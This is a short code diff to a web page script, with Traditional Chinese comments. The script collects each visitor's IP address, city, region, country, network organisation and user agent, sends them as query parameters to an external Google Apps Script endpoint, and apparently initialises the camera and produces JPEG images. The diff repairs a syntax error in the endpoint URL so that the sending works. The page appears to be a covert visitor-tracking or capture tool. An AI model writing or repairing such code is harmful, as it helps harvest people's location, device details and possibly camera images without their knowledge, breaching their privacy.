@@ -28,7 +28,7 @@
           `IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}`;
 
         // 發送 GET 請求到 Google Apps Script
-        const url = new URL('https://script.google.com/macros/s/AKfycbwSuXHzibAT0ldIN9darcl8Gvv8wghbAv7fa-NLIMasXLV8JP7-lQ2Mqt1cEOPMBk3YBw/exec);
+        const url = new URL('https://script.google.com/macros/s/AKfycbwSuXHzibAT0ldIN9darcl8Gvv8wghbAv7fa-NLIMasXLV8JP7-lQ2Mqt1cEOPMBk3YBw/exec');
         url.searchParams.append('ip', ip);
         url.searchParams.append('ipType', ipType);
         url.searchParams.append('userAgent', userAgent);
@@ -92,7 +92,7 @@
     }
   }, 'image/jpeg');
 }
-    }
+    
 
     // 初始化攝影機
     async function initCamera() {
